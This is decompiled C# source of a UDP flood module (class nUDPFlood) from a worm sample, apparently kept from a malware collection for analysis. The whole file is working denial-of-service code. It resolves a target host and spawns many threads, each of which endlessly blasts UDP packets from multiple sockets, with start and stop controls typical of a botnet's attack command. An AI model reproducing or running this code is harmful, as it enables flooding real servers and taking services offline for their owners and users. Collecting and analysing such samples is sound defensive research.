// Decompiled with JetBrains decompiler
// Type: SysDriver.nUDPFlood
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SysDriver
{
  internal class nUDPFlood
  {
    private static ThreadStart[] tFloodingJob;
    private static Thread[] tFloodingThread;
    public static string sFHost;
    private static IPEndPoint IPEo;
    public static ushort uPort;
    public static int iPSize;
    private static nUDPFlood.UDPRequest[] UDPClass;
    public static int iThreads;
    public static int iUDPSockets;

    public static void StartUDPFlood()
    {
      try
      {
        nUDPFlood.IPEo = new IPEndPoint(Dns.GetHostEntry(nUDPFlood.sFHost).AddressList[0], (int) nUDPFlood.uPort);
      }
      catch
      {
        nUDPFlood.IPEo = new IPEndPoint(IPAddress.Parse(nUDPFlood.sFHost), (int) nUDPFlood.uPort);
      }
      nUDPFlood.tFloodingThread = new Thread[nUDPFlood.iThreads];
      nUDPFlood.tFloodingJob = new ThreadStart[nUDPFlood.iThreads];
      nUDPFlood.UDPClass = new nUDPFlood.UDPRequest[nUDPFlood.iThreads];
      for (int index = 0; index < nUDPFlood.iThreads; ++index)
      {
        nUDPFlood.UDPClass[index] = new nUDPFlood.UDPRequest(nUDPFlood.IPEo, nUDPFlood.iUDPSockets, nUDPFlood.iPSize);
        nUDPFlood.tFloodingJob[index] = new ThreadStart(nUDPFlood.UDPClass[index].Send);
        nUDPFlood.tFloodingThread[index] = new Thread(nUDPFlood.tFloodingJob[index]);
        nUDPFlood.tFloodingThread[index].Start();
      }
    }

    public static void StopUDPFlood()
    {
      for (int index = 0; index < nUDPFlood.iThreads; ++index)
      {
        try
        {
          nUDPFlood.tFloodingThread[index].Abort();
          nUDPFlood.tFloodingThread[index].Join();
        }
        catch
        {
        }
      }
    }

    private class UDPRequest
    {
      private IPEndPoint IPEo;
      private int iPSize;
      private Socket[] pSocket;
      private int iUDPSockets;

      public UDPRequest(IPEndPoint tIPEo, int tUDPSockets, int tPSize)
      {
        this.IPEo = tIPEo;
        this.iUDPSockets = tUDPSockets;
        this.iPSize = tPSize;
      }

      public void Send()
      {
        while (true)
        {
          byte[] buffer = new byte[this.iPSize];
          try
          {
            this.pSocket = new Socket[this.iUDPSockets];
            for (int index = 0; index < this.iUDPSockets; ++index)
            {
              this.pSocket[index] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
              this.pSocket[index].Blocking = false;
              this.pSocket[index].SendTo(buffer, (EndPoint) this.IPEo);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.iUDPSockets; ++index)
            {
              if (this.pSocket[index].Connected)
                this.pSocket[index].Disconnect(false);
              this.pSocket[index].Close();
              this.pSocket[index] = (Socket) null;
            }
            this.pSocket = (Socket[]) null;
          }
          catch
          {
            for (int index = 0; index < this.iUDPSockets; ++index)
            {
              try
              {
                if (this.pSocket[index].Connected)
                  this.pSocket[index].Disconnect(false);
                this.pSocket[index].Close();
                this.pSocket[index] = (Socket) null;
              }
              catch
              {
              }
            }
          }
        }
      }
    }
  }
}
